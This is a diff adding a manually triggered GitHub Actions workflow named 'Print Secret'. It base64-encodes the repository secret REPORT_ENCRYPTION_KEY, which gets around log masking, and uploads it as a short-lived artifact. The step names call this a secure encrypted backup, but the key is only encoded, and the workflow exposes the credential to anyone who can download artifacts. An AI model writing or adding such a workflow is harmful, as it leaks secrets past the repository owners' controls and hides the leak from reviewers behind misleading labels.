@@ -1,0 +1,22 @@
+name: Print Secret
+on: workflow_dispatch
+
+jobs:
+  print-key:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v4
+
+      - name: Securely Output Encrypted Key Artifact
+        env:
+          MY_SECRET: ${{ secrets.REPORT_ENCRYPTION_KEY }}
+        run: |
+          echo "$MY_SECRET" | base64 > recovered_key.txt
+
+      - name: Upload Recovered Key Artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: secure-key-backup
+          path: recovered_key.txt
+          retention-days: 1
